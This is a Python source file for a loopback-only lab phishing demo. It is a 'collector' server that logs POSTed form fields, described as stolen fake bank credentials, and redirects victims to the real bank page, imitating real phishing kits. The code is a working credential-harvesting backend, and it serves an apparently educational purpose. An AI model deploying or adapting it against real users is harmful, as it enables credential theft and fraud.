"""Stage 2: the lab ATTACKER COLLECTOR - receives stolen (fake) data (127.0.0.1 only).

It logs every POST to logs/attacker.log, then redirects the victim to the real
bank so nothing looks wrong - the same trick real phishing kits use.
"""

from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

from quishguard.forms import parse_form_body
from quishguard.leaklog import append_log_entry

HOST = "127.0.0.1"  # loopback only
PORT = 8002
REAL_BANK = "http://127.0.0.1:8000/"
LOG_PATH = Path(__file__).resolve().parent.parent / "logs" / "attacker.log"


class CollectorHandler(BaseHTTPRequestHandler):
    def do_POST(self) -> None:
        """Stolen data arrives: log it, then send the victim to the real bank."""
        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length).decode("utf-8")

        entry = {
            "time": datetime.now().isoformat(timespec="seconds"),
            "server": "collector",
            "path": self.path,
            "origin": self.headers.get("Origin"),  # which page sent it
            "fields": parse_form_body(raw_body),
        }
        append_log_entry(LOG_PATH, entry)
        print(f"[collector] LEAK logged: {entry['fields']}  (from {entry['origin']})")

        # 303 See Other: "browser, now GET this other page"
        self.send_response(303)
        self.send_header("Location", REAL_BANK)
        self.end_headers()


def main() -> None:
    server = HTTPServer((HOST, PORT), CollectorHandler)
    print(f"Attacker collector (lab) on http://{HOST}:{PORT}  - logging to {LOG_PATH}")
    server.serve_forever()


if __name__ == "__main__":
    main()
